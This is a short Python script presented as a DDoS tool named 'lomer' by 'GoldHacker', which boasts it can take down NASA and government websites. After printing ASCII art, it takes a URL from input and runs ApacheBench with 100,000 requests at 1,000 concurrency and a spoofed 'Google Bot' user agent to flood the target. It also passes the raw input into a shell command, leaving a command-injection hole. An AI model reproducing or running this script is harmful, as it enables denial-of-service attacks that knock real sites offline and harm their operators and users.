import os
import time
import random




# ----------------------------------------------------------------------------------------------
# lomer - DDoS Tool
#
# The DDoS Protocol is the most massive type of attack
# This tool can tangodown nasa and more gov websites
# 
#
# author : GoldHacker , version 1.0
# ----------------------------------------------------------------------------------------------

os.system('clear')

print (
    """                        
             ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |      DDOS!      |  |  |     |         |      |
     |  |                 |  |  |/----|`---=    |      |
     |  |   $GoldHacker   |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [   ]|    ,"
     |  `-----------------'  |," .;'  |((((     |  ,"
     +-----------------------+  ;;    |         |,"
        /_)______________(_/  //'     +---------+
   ___________________________/___  
  /  oooooooooooooooo  .o.  oooo /,   
 / ==ooooooooooooooo==.o.  ooo= //   
/_==__==========__==_ooo__ooo=_/' 


lomer has started!

"""
)





url=input('URL: ')
os.system('ab -n 100000 -c 1000 -k -r -H  "User-Argent: Google Bot" ' + url)